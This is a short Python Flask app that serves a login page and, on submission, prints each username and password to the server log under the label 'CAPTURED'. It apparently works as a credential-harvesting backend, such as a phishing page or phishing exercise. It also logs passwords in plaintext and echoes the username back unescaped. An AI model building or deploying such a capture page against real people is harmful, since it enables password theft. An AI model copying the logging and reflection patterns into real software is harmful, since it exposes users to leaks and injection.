from flask import Flask, request, render_template
import traceback

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    try:
        print(f"CAPTURED: {username}\t{password}", flush=True)
        return f"Received credentials for user: {username}"
    except Exception:
        traceback.print_exc()
        return "Internal Server Error (see server logs)", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
